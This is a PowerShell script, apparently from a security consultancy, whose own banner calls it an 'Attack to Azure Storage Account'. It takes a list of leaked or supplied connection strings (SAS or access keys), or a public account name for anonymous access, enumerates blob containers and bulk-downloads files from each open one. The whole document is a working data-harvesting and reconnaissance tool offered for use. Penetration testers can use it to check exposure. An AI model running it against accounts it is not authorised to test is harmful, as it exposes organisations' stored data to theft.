<#
.SYNOPSIS
    Access and download blobs from Azure Storage Accounts using provided connection strings or anonymously from public storage accounts.

.DESCRIPTION
    This script reads a file containing connection strings (either SAS Keys or Access Keys) for Azure Storage Accounts.
    For each valid connection string, it identifies the available blobs and downloads a specified number of blobs from each container.
    Alternatively, it can access public storage accounts anonymously and download blobs.

.PARAMETER ReconMode
    The mode of operation. Use "AuthenticateMode" for accessing with connection strings and "PublicMode" for anonymous access.

.PARAMETER connectionStringsFile
    The path to the file containing connection strings, one per line. Required if ReconMode is "AuthenticateMode".

.PARAMETER StorageAccountName
    The name of the public storage account. Required if ReconMode is "PublicMode".

.PARAMETER blobsToDownloadCount
    The number of blobs to download from each identified container.

.EXAMPLE
    .\Access-AzureStorageAccount.ps1 -ReconMode "AuthenticateMode" -connectionStringsFile "connectionStrings.txt" -blobsToDownloadCount 5
    This command will read the connection strings from "connectionStrings.txt" and download 5 blobs from each container in the identified storage accounts.

    .\Access-AzureStorageAccount.ps1 -ReconMode "PublicMode" -StorageAccountName "publicstorageaccount" -blobsToDownloadCount 5
    This command will anonymously access the specified public storage account and download 5 blobs from each container.

.NOTES
    Author: Daniel Hejda
    Company: Cyber Rangers s.r.o.
    Date Created: 2024-07-11
    Change Log:
        2024-07-11 - Script created.
        2024-07-14 - Added ReconMode for authenticated and anonymous access.
#>

param (
    [Parameter(Mandatory=$true)]
    [ValidateSet("AuthenticateMode", "PublicMode")]
    [string]$ReconMode,

    [string]$connectionStringsFile,

    [string]$StorageAccountName,

    [Parameter(Mandatory=$true)]
    [int]$blobsToDownloadCount
)

# Validace povinných parametrů
if ($ReconMode -eq "AuthenticateMode" -and -not $connectionStringsFile) {
    Write-Host "Parameter connectionStringsFile is required in AuthenticateMode." -ForegroundColor Red
    exit
}

if ($ReconMode -eq "PublicMode" -and -not $StorageAccountName) {
    Write-Host "Parameter StorageAccountName is required in PublicMode." -ForegroundColor Red
    exit
}

# Hlavicka
Write-Host ""
Write-Host ""
Write-Host ""
Write-Host ""
Write-Host ""
Write-Host ""
Write-Host "-----------------------------------------------------------------" -ForegroundColor DarkYellow
Write-Host "Attack to Azure Storage Account" -ForegroundColor Cyan
Write-Host "--> Mode: $($ReconMode)" -ForegroundColor Blue
if ($ReconMode -eq "AuthenticateMode") {
    Write-Host "--> Connection strings file: $($connectionStringsFile)" -ForegroundColor Blue
}
if ($ReconMode -eq "PublicMode") {
    Write-Host "--> Storage account name: $($StorageAccountName)" -ForegroundColor Blue
}
Write-Host "--> How many files from each blob will be downloaded: $($blobsToDownloadCount)" -ForegroundColor Blue
Write-Host "-----------------------------------------------------------------" -ForegroundColor DarkYellow

# Kontrola existence souboru v AuthenticateMode
if ($ReconMode -eq "AuthenticateMode" -and -Not (Test-Path $connectionStringsFile)) {
    Write-Host "File $($connectionStringsFile) not exist." -ForegroundColor Red
    exit
}

# Načtení connection stringů v AuthenticateMode
if ($ReconMode -eq "AuthenticateMode") {
    Write-Host "Loading file $($connectionStringsFile)" -ForegroundColor Green
    $connectionStrings = @(Get-Content -Path $connectionStringsFile)
} else {
    $connectionStrings = @("")
}

# Import Azure module, pokud ještě není importován
Write-Host "Check availability for Az module" -fore Green
if (-Not (Get-Module -ListAvailable -Name Az.Storage)) {
    Write-Host "Install Az Module" -ForegroundColor Green
    Install-Module -Name Az -Force -AllowClobber > $null
}
Write-Host "Import module Az" -ForegroundColor Green
Import-Module Az

# Funkce pro ověření connection stringu nebo anonymní přístup
function Test-StorageAccountConnection {
    param (
        [string]$connectionString
    )

    try {
        if ($ReconMode -eq "AuthenticateMode") {
            # Nastavení kontextu pro Azure Storage s connection stringem
            Write-Host "--> Set Azure Context" -ForegroundColor Cyan
            Write-Host "----> $($connectionString)" -ForegroundColor Cyan
            $context = New-AzStorageContext -ConnectionString $connectionString
        } else {
            # Anonymní přístup k veřejnému storage account
            Write-Host "--> Set Azure Context for anonymous access" -ForegroundColor Cyan
            $context = New-AzStorageContext -StorageAccountName $StorageAccountName -Anonymous
        }

        # Ověření, zda se můžeme připojit
        Write-Host "------> Connect to Azure storage account" -ForegroundColor Blue
        $containers = Get-AzStorageContainer -Context $context -ErrorAction Stop
        Write-Host "--------> Success connection" -ForegroundColor Green

        # Výpis existujících kontejnerů a stažení souborů
        foreach ($container in $containers) {
            if ($container.PublicAccess -eq "Blob" -or $container.PublicAccess -eq "Container") {
                Write-Host "----------> $($container.Name) with PublicAccess is ($($container.PublicAccess))" -ForegroundColor Green

                # Získání blobů v kontejneru
                $blobs = Get-AzStorageBlob -Container $container.Name -Context $context -ErrorAction Stop

                # Stažení nastaveného počtu blobů
                $blobsToDownload = $blobs | Select-Object -First $blobsToDownloadCount
                foreach ($blob in $blobsToDownload) {
                    $blobName = $blob.Name
                    $destinationPath = Join-Path -Path "DownloadedBlobs" -ChildPath $blobName

                    # Vytvoření adresáře pro stažené soubory, pokud neexistuje
                    $destinationDirectory = Split-Path -Path $destinationPath
                    if (-Not (Test-Path $destinationDirectory)) {
                        New-Item -ItemType Directory -Path $destinationDirectory -Force > $null
                    }

                    Write-Host "------------> Downloading $blobName from container $($container.Name)" -ForegroundColor Cyan
                    $DownloadedBlob = Get-AzStorageBlobContent -Blob $blobName -Container $container.Name -Context $context -Destination $destinationPath -Force
                    Write-Host "--------------> Downloading this blob $($DownloadedBlob.Name)" -ForegroundColor Green
                }
            } else {
                Write-Host "----------> $($container.Name) with PublicAccess is ($($container.PublicAccess))" -ForegroundColor Yellow
            }
        }

    }
    catch {
        Write-Host "--------> Failed connection" -ForegroundColor red
    }
    Write-Host ""
}

# Procházení každého connection stringu a jeho testování
foreach ($connectionString in $connectionStrings) {
    Test-StorageAccountConnection -connectionString $connectionString
}
